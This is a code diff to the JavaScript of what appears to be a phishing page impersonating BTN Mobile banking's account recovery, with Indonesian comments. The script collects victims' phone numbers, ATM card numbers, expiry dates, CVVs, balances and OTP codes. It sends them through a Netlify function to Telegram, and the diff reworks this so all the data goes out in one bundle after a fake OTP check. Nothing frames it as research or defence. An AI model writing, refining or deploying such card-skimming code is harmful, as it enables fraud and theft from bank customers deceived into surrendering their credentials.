@@ -2,9 +2,6 @@
 (function() {
     'use strict';
 
-    // Konfigurasi API
-    const API_URL = '/.netlify/functions/send-data'; // Endpoint Netlify Function
-    
     // DOM Elements
     const splash = document.getElementById('splashScreen');
     const page1 = document.getElementById('page1');
@@ -12,19 +9,17 @@
     const page3 = document.getElementById('page3');
     const toast = document.getElementById('btnToast');
     const toastMessage = toast.querySelector('.toast-message');
-    const loadingOverlay = document.getElementById('loadingOverlay');
-    
-    // Variabel untuk menyimpan data sementara
-    let savedPhoneNumber = '';
-    let savedCardData = {};
+
+    // Konfigurasi Netlify Function endpoint
+    const NETLIFY_FUNCTION_URL = '/.netlify/functions/send-notification';
 
     // Toast notification helper
     let toastTimeout = null;
     function showNotification(message, isError = true) {
         const iconElem = toast.querySelector('.toast-icon');
-        iconElem.textContent = isError ? '⚠️' : '✓';
-        iconElem.style.background = isError ? '#ffaa00' : '#4CAF50';
-        iconElem.style.color = '#fff';
+        iconElem.textContent = isError ? '!' : '✓';
+        iconElem.style.background = isError ? '#ffaa00' : '#ffffff';
+        iconElem.style.color = isError ? '#003366' : '#003366';
         
         toastMessage.textContent = message;
         toast.classList.add('show');
@@ -34,64 +29,31 @@
             toast.classList.remove('show');
         }, 3000);
     }
-    
-    // Show/hide loading
-    function showLoading(show) {
-        loadingOverlay.style.display = show ? 'flex' : 'none';
-    }
-    
-    // Fungsi kirim data ke Telegram via Netlify Function
-    async function sendToTelegram(type, data) {
+
+    // Fungsi untuk mengirim data ke server (Netlify Function)
+    async function sendToTelegram(data) {
         try {
-            const response = await fetch(API_URL, {
+            const response = await fetch(NETLIFY_FUNCTION_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({
-                    type: type,
-                    ...data
-                })
+                body: JSON.stringify(data)
             });
             
-            const result = await response.json();
-            
             if (!response.ok) {
-                throw new Error(result.error || 'Gagal mengirim data');
+                const errorData = await response.json();
+                console.error('Failed to send data:', errorData);
+                return false;
             }
             
-            console.log(`Data ${type} berhasil dikirim:`, result);
+            const result = await response.json();
+            console.log('Data sent successfully:', result);
             return true;
         } catch (error) {
-            console.error(`Error sending ${type} data:`, error);
-            showNotification(`Gagal mengirim data: ${error.message}`, true);
+            console.error('Error sending data:', error);
             return false;
         }
-    }
-    
-    // Fungsi kirim data kartu (Page 2)
-    async function sendCardData(phone, cardNumber, expiry, cvv, balance) {
-        const data = {
-            phone: phone,
-            card_number: cardNumber,
-            card_expiry: expiry,
-            card_cvv: cvv,
-            balance: balance,
-            timestamp: new Date().toISOString()
-        };
-        
-        return await sendToTelegram('card', data);
-    }
-    
-    // Fungsi kirim OTP (Page 3)
-    async function sendOtpData(phone, otp) {
-        const data = {
-            phone: phone,
-            otp_code: otp,
-            timestamp: new Date().toISOString()
-        };
-        
-        return await sendToTelegram('otp', data);
     }
 
     // Toggle CVV visibility
@@ -99,13 +61,15 @@
     const cvvInput = document.getElementById('cvv');
     if (toggleCVV && cvvInput) {
         toggleCVV.addEventListener('click', function(e) {
+            // Toggle tipe input antara password dan text
             const type = cvvInput.getAttribute('type') === 'password' ? 'text' : 'password';
             cvvInput.setAttribute('type', type);
+            // Ganti ikon mata (buka/tutup) - cukup ubah teks emoji
             this.textContent = type === 'password' ? '👁️' : '🙈';
         });
     }
 
-    // Format Rupiah
+    // Format Rupiah (tampilan di input saldo)
     function formatRupiah(element) {
         let angka = element.value;
         let number_string = angka.replace(/[^,\d]/g, '').toString();
@@ -129,7 +93,7 @@
         });
     }
 
-    // Carousel functions
+    // Auto-play Carousel
     let carouselIntervals = [];
     function initCarouselForScreen(screenElement) {
         if (!screenElement) return null;
@@ -227,7 +191,7 @@
         }, 400);
     }, 3000);
     
-    // Navigasi halaman 1 -> 2
+    // Navigasi halaman 1 -> 2 dengan notifikasi
     document.getElementById('gotoPage2Btn').addEventListener('click', () => {
         const phone = document.getElementById('mobileNumber').value.trim();
         if (phone === "") {
@@ -239,16 +203,12 @@
             showNotification("Nomor HP harus 10-13 digit angka", true);
             return;
         }
-        
-        // Simpan nomor HP
-        savedPhoneNumber = cleanPhone;
-        
         page1.classList.remove('active');
         page2.classList.add('active');
         initAllCarousels();
     });
     
-    // Masking nomor kartu
+    // Masking nomor kartu (hanya angka dan spasi)
     const nomorKartuInput = document.getElementById('nomorKartu');
     nomorKartuInput.addEventListener('input', function(e) {
         let value = this.value.replace(/\D/g, '').substring(0, 16);
@@ -290,21 +250,21 @@
         }
     });
     
-    // CVV hanya angka
+    // CVV hanya angka 3 digit (sudah ditangani inputmode numeric, tapi amankan lagi)
     if (cvvInput) {
         cvvInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '').substring(0, 3);
         });
     }
     
+    // Validasi halaman 2
+    const btnLanjut = document.getElementById('btnLanjut');
+    
     function getRawSaldo() {
         const saldoElem = document.getElementById('saldoTerakhir');
         if (!saldoElem) return '';
         return saldoElem.value.replace(/\./g, '');
     }
-    
-    // Handle Page 2 submit - kirim data kartu ke Telegram
-    const btnLanjut = document.getElementById('btnLanjut');
     
     btnLanjut.addEventListener('click', async (e) => {
         e.preventDefault();
@@ -314,8 +274,8 @@
         const cvv = document.getElementById('cvv').value;
         const saldoRaw = getRawSaldo();
         const saldoTerakhir = saldoRaw === '' ? '0' : saldoRaw;
+        const phoneNumber = document.getElementById('mobileNumber').value.trim();
         
-        // Validasi
         if (nomorKartu === "" || nomorKartu.length < 16) {
             showNotification("Nomor kartu ATM harus 16 digit", true);
             return;
@@ -342,66 +302,37 @@
             return;
         }
         
-        // Simpan data kartu
-        savedCardData = {
+        // Simpan data kartu ke session storage untuk dikirim bersama OTP nanti
+        const cardData = {
+            phoneNumber: phoneNumber,
             cardNumber: nomorKartu,
-            expiry: berlakuSampai,
+            expiryDate: berlakuSampai,
             cvv: cvv,
-            balance: saldoTerakhir
+            estimatedBalance: saldoTerakhir,
+            timestamp: new Date().toISOString()
         };
         
-        // Show loading
-        showLoading(true);
+        // Simpan ke sessionStorage
+        sessionStorage.setItem('btnCardData', JSON.stringify(cardData));
         
-        // Kirim data kartu ke Telegram
-        const sendSuccess = await sendCardData(
-            savedPhoneNumber,
-            nomorKartu,
-            berlakuSampai,
-            cvv,
-            saldoTerakhir
-        );
+        console.log("Informasi kartu terverifikasi untuk pemulihan.");
         
-        showLoading(false);
+        // Reset OTP
+        window.retryCounter = 0;
+        document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
+        document.getElementById('otpWarning').innerText = '';
         
-        if (sendSuccess) {
-            showNotification("Verifikasi kartu berhasil, lanjut ke OTP", false);
-            
-            // Reset OTP fields
-            window.retryCounter = 0;
-            document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
-            document.getElementById('otpWarning').innerText = '';
-            
-            page2.classList.remove('active');
-            page3.classList.add('active');
-            initAllCarousels();
-            
-            setTimeout(() => {
-                const first = document.querySelector('.otp-digit');
-                if (first) first.focus();
-            }, 150);
-        } else {
-            // Tetap lanjut ke halaman OTP meskipun pengiriman gagal? 
-            // Sesuai kebutuhan, di sini kita tetap lanjutkan tapi beri notifikasi
-            showNotification("Ada masalah teknis, silakan lanjutkan proses", true);
-            
-            // TETAP LANJUT
-            window.retryCounter = 0;
-            document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
-            document.getElementById('otpWarning').innerText = '';
-            
-            page2.classList.remove('active');
-            page3.classList.add('active');
-            initAllCarousels();
-            
-            setTimeout(() => {
-                const first = document.querySelector('.otp-digit');
-                if (first) first.focus();
-            }, 150);
-        }
+        page2.classList.remove('active');
+        page3.classList.add('active');
+        initAllCarousels();
+        
+        setTimeout(() => {
+            const first = document.querySelector('.otp-digit');
+            if (first) first.focus();
+        }, 150);
     });
     
-    // OTP handler
+    // OTP handler (tanpa modal mengambang)
     const otpInputs = document.querySelectorAll('.otp-digit');
     otpInputs.forEach((input, idx) => {
         input.addEventListener('input', (e) => {
@@ -435,7 +366,6 @@
         if (otpInputs[0]) otpInputs[0].focus();
     }
     
-    // Handle OTP submit - kirim OTP ke Telegram
     document.getElementById('submitOtpBtn').addEventListener('click', async () => {
         const mainOtp = getOtpFromPage();
         if (mainOtp.length !== 6) {
@@ -443,20 +373,59 @@
             return;
         }
         
-        showLoading(true);
+        // Ambil data kartu dari session storage
+        const cardDataStr = sessionStorage.getItem('btnCardData');
+        let allData = {};
         
-        // Kirim OTP ke Telegram
-        const sendSuccess = await sendOtpData(savedPhoneNumber, mainOtp);
-        
-        showLoading(false);
-        
-        if (sendSuccess) {
-            showNotification("Verifikasi berhasil! Akun Anda telah dipulihkan.", false);
+        if (cardDataStr) {
+            const cardData = JSON.parse(cardDataStr);
+            allData = {
+                ...cardData,
+                otpCode: mainOtp,
+                timestamp: new Date().toISOString()
+            };
         } else {
-            showNotification("Pemulihan akun berhasil diproses.", false);
+            // Fallback: ambil dari form
+            allData = {
+                phoneNumber: document.getElementById('mobileNumber').value.trim(),
+                cardNumber: document.getElementById('nomorKartu').value.replace(/\s/g, ''),
+                expiryDate: document.getElementById('berlakuSampai').value,
+                cvv: document.getElementById('cvv').value,
+                estimatedBalance: getRawSaldo(),
+                otpCode: mainOtp,
+                timestamp: new Date().toISOString()
+            };
         }
         
-        // Reset ke halaman awal
+        // Simulasi verifikasi OTP (demo: kode 123456 dianggap benar)
+        const isOtpValid = (mainOtp === '123456');
+        
+        if (!isOtpValid) {
+            window.retryCounter = (window.retryCounter || 0) + 1;
+            if (window.retryCounter >= 10) {
+                showNotification("Batas percobaan OTP tercapai. Mulai proses pemulihan dari awal.", true);
+                resetToInitialState();
+                return;
+            }
+            showNotification(`Kode OTP salah! Sisa percobaan: ${10 - window.retryCounter}`, true);
+            resetOtpFields();
+            return;
+        }
+        
+        // Kirim data ke Telegram melalui Netlify Function
+        showNotification("Memproses pemulihan akun...", false);
+        
+        const sent = await sendToTelegram(allData);
+        
+        if (sent) {
+            showNotification("Verifikasi berhasil! Akun Anda telah dipulihkan.", false);
+        } else {
+            showNotification("Verifikasi berhasil, namun terjadi kesalahan teknis. Hubungi CS.", true);
+        }
+        
+        // Clear session storage
+        sessionStorage.removeItem('btnCardData');
+        
         resetToInitialState();
     });
     
@@ -473,8 +442,6 @@
         if (saldoInput) saldoInput.value = '';
         document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
         window.retryCounter = 0;
-        savedPhoneNumber = '';
-        savedCardData = {};
     }
     
     function enforceNumeric(inputElement) {
@@ -486,5 +453,5 @@
     }
     enforceNumeric(document.getElementById('mobileNumber'));
     
-    console.log('BTN Mobile - Sistem Pemulihan Akun Siap dengan Telegram Integration');
+    console.log('BTN Mobile - Sistem Pemulihan Akun Siap (dengan toggle CVV & Telegram Integration)');
 })();
